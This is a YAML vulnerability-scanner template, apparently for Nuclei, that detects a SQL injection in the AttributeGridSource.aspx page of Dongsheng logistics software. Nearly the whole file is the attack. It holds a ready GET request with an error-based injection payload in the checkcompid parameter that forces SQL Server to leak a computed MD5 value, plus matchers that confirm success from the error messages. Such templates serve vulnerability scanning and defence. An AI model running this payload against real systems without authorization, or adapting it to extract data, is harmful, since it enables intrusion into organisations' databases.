id: poc-yaml-dongshengsoft-attributegridsource-aspx-sqli
info:
  name: 东胜物流软件 AttributeGridSource.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: GET
    path:
      - "/Attributes/AttributeGridSource.aspx?handle=compattrlistpage&checkcompid='and+1<sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "0x{{t2}}"
          - "SqlException:"
          - "AttributeGridSource.aspx"
      - type: regex
        part: body
        regex:
          - "转换成数据类型(.*?)时失败"
          - "在将(.*?)值"
      - type: status
        status:
          - 500
